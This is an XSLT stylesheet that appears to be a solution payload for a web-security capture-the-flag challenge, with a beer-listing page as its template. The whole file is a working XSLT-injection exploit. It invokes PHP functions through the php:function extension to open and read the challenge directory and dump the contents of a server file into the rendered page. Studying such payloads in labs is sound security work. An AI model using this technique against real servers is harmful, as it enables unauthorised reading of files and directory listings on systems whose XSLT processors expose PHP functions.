<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
xmlns:php="http://php.net/xsl"
>	
<xsl:template match="/">	
<xsl:param  name="shandle"    select="php:function('opendir','/challenge/web-serveur/ch50')" />
<xsl:param  name="strscand"   select="php:function('readdir',php:function('opendir','/challenge/web-serveur/ch50'))" /> 
<xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/beers.xml')"/>
<div style="background-color:teal;color:white;padding:4px">
<span style="font-weight:bold">
 DIR2 count:<xsl:value-of select="$strscand"/>     
 DIR2 scan:<xsl:value-of select="$shandle"/>       
 DIR1 index.php:<xsl:value-of select="$header"/>   
<xsl:value-of select="name"/>
-
</span>
<xsl:value-of select="price"/>
</div>
<div style="margin-left:20px;margin-bottom:1em;font-size:12pt">
<p>
<xsl:value-of select="description"/>
<span style="font-style:italic">
(
<xsl:value-of select="prct"/>
%)
</span>
</p>
</div>
</xsl:template>
</xsl:stylesheet>
